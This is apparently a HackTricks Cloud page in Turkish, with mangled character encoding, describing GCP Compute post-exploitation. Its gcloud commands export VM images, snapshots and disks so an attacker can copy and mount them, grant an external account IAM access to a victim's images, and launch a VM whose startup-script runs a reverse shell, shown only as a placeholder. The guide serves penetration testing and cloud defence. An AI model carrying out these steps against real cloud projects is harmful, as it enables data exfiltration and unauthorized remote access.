# GCP - Compute Post Exploitation

<details>

<summary><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'Ä± **takip edin**.
* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.

</details>

## Hesaplama

Hesaplama ve VPC (AÄŸ) hakkÄ±nda daha fazla bilgi iÃ§in:

{% content-ref url="../gcp-services/gcp-compute-instances-enum/" %}
[gcp-compute-instances-enum](../gcp-services/gcp-compute-instances-enum/)
{% endcontent-ref %}

### GÃ¶rÃ¼ntÃ¼leri Yerel Olarak DÄ±ÅŸa Aktar ve Ä°ncele

Bu, bir saldÄ±rganÄ±n **zaten mevcut gÃ¶rÃ¼ntÃ¼lerin iÃ§inde bulunan verilere eriÅŸmesine** veya **Ã§alÄ±ÅŸan sanal makinelerin yeni gÃ¶rÃ¼ntÃ¼lerini oluÅŸturmasÄ±na** ve Ã§alÄ±ÅŸan VM'lerin verilerine eriÅŸmesine olanak tanÄ±r.

Bir VM gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ bir kovaya dÄ±ÅŸa aktarmak ve ardÄ±ndan aÅŸaÄŸÄ±daki komutla indirip yerel olarak baÄŸlamak mÃ¼mkÃ¼ndÃ¼r:

{% code overflow="wrap" %}
```
```
{% endcode %}

```bash
gcloud compute images export --destination-uri gs://<bucket-name>/image.vmdk --image imagetest --export-format vmdk
# The download the export from the bucket and mount it locally
```

Bu iÅŸlemi gerÃ§ekleÅŸtirmek iÃ§in saldÄ±rganÄ±n depolama kovasÄ±na ve kesinlikle **cloudbuild Ã¼zerinde ayrÄ±calÄ±klara** ihtiyacÄ± olabilir Ã§Ã¼nkÃ¼ bu iÅŸlemi gerÃ§ekleÅŸtirmek iÃ§in **hizmet** istenecektir.\
AyrÄ±ca, bu iÅŸin Ã§alÄ±ÅŸmasÄ± iÃ§in codebuild SA ve compute SA'nÄ±n ayrÄ±calÄ±klÄ± izinlere ihtiyacÄ± vardÄ±r.\
cloudbuild SA `<proje-id>@cloudbuild.gserviceaccount.com` ÅŸunlara ihtiyaÃ§ duyar:

* roller/iam.serviceAccountTokenCreator
* roller/compute.admin
* roller/iam.serviceAccountUser

Ve SA `<proje-id>-compute@developer.gserviceaccount.com` ÅŸunlara ihtiyaÃ§ duyar:

* roller/compute.storageAdmin
* roller/storage.objectAdmin

### AnlÄ±k GÃ¶rÃ¼ntÃ¼leri ve Diskleri Yerel Olarak DÄ±ÅŸa AktarÄ±n ve Ä°nceleyin

AnlÄ±k gÃ¶rÃ¼ntÃ¼leri ve diskleri doÄŸrudan dÄ±ÅŸa aktarmak mÃ¼mkÃ¼n deÄŸildir, ancak bir anlÄ±k gÃ¶rÃ¼ntÃ¼yÃ¼ bir diske, bir diski bir gÃ¶rÃ¼ntÃ¼ye **dÃ¶nÃ¼ÅŸtÃ¼rmek** ve **Ã¶nceki bÃ¶lÃ¼mÃ¼** takip ederek bu gÃ¶rÃ¼ntÃ¼yÃ¼ yerel olarak incelemek mÃ¼mkÃ¼ndÃ¼r.

{% code overflow="wrap" %}
```bash
# Create a Disk from a snapshot
gcloud compute disks create [NEW_DISK_NAME] --source-snapshot=[SNAPSHOT_NAME] --zone=[ZONE]

# Create an image from a disk
gcloud compute images create [IMAGE_NAME] --source-disk=[NEW_DISK_NAME] --source-disk-zone=[ZONE]
```
{% endcode %}

### Bir GÃ¶rÃ¼ntÃ¼yÃ¼ Ä°nceleme ve Bir Sanal Makine OluÅŸturma

Bir saldÄ±rganÄ±n bir gÃ¶rÃ¼ntÃ¼ oluÅŸturduÄŸu yerden bir gÃ¶rÃ¼ntÃ¼de depolanan verilere veya Ã§alÄ±ÅŸan bir sanal makinedeki verilere eriÅŸmek amacÄ±yla, bir harici hesaba gÃ¶rÃ¼ntÃ¼ Ã¼zerinde eriÅŸim vermek mÃ¼mkÃ¼ndÃ¼r:

```bash
gcloud projects add-iam-policy-binding [SOURCE_PROJECT_ID] \
--member='serviceAccount:[TARGET_PROJECT_SERVICE_ACCOUNT]' \
--role='roles/compute.imageUser'
```

ve ardÄ±ndan ondan yeni bir VM oluÅŸturun:

```bash
gcloud compute instances create [INSTANCE_NAME] \
--project=[TARGET_PROJECT_ID] \
--zone=[ZONE] \
--image=projects/[SOURCE_PROJECT_ID]/global/images/[IMAGE_NAME]
```

EÄŸer dÄ±ÅŸ hesabÄ±nÄ±za gÃ¶rÃ¼ntÃ¼ Ã¼zerinde eriÅŸim veremediyseniz, kurbanÄ±n projesinde o gÃ¶rÃ¼ntÃ¼yÃ¼ kullanarak bir sanal makine baÅŸlatabilir ve metadata'yÄ± geriye dÃ¶nÃ¼k bir kabuk Ã§alÄ±ÅŸtÄ±rmak iÃ§in deÄŸiÅŸtirebilirsiniz. Bunun iÃ§in parametre ekleyin:

```bash
--metadata startup-script='#! /bin/bash
echo "hello"; <reverse shell>'
```

### Bir Snapshot/Disk'i bir VM'ye baÄŸlayarak Ä°nceleyin

Bir diske veya snapshot'a eriÅŸmek amacÄ±yla, snapshot'Ä± bir diske, diski bir gÃ¶rÃ¼ntÃ¼ye dÃ¶nÃ¼ÅŸtÃ¼rebilir ve Ã¶nceki adÄ±mlarÄ± takip edebilirsiniz.

Veya **harici bir hesaba eriÅŸim izni verebilirsiniz** (baÅŸlangÄ±Ã§ noktasÄ± bir snapshot ise, snapshot Ã¼zerinde eriÅŸim izni verin veya ondan bir disk oluÅŸturun):

```bash
gcloud projects add-iam-policy-binding [PROJECT_ID] \
--member='user:[USER_EMAIL]' \
--role='roles/compute.storageAdmin'
```

**Bir diski** bir Ã¶rneÄŸe baÄŸlayÄ±n:

```bash
gcloud compute instances attach-disk [INSTANCE_NAME] \
--disk [DISK_NAME] \
--zone [ZONE]
```

Sanal makine iÃ§inde diski baÄŸlayÄ±n:

1. **Sanal makineye SSH ile baÄŸlanÄ±n**:

```sh
gcloud compute ssh [INSTANCE_NAME] --zone [ZONE]
```

2. **Diski TanÄ±mlayÄ±n**: Sanal makineye girdikten sonra, disk cihazlarÄ±nÄ± listelerken yeni diski tanÄ±mlayÄ±n. Genellikle `/dev/sdb`, `/dev/sdc` gibi bir ÅŸekilde bulabilirsiniz.
3. **Diski BiÃ§imlendirin ve BaÄŸlayÄ±n** (yeni veya ham bir diskse):

* Bir baÄŸlama noktasÄ± oluÅŸturun:

```sh
sudo mkdir -p /mnt/disks/[MOUNT_DIR]
```

* Diski baÄŸlayÄ±n:

```sh
sudo mount -o discard,defaults /dev/[DISK_DEVICE] /mnt/disks/[MOUNT_DIR]
```

EÄŸer **bir dÄ±ÅŸ projeye snapshot veya diske eriÅŸim veremezseniz**, bu iÅŸlemleri snapshot/disk ile aynÄ± projedeki bir Ã¶rnekte gerÃ§ekleÅŸtirmeniz gerekebilir.

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmaya kadar AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek iÃ§in** [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) **kontrol edin**!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) **edinin**
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) **koleksiyonumuzu keÅŸfedin**, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* **ğŸ’¬** [**Discord grubuna**](https://discord.gg/hRep4RUj7f) **veya** [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n veya** **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'Ä± takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
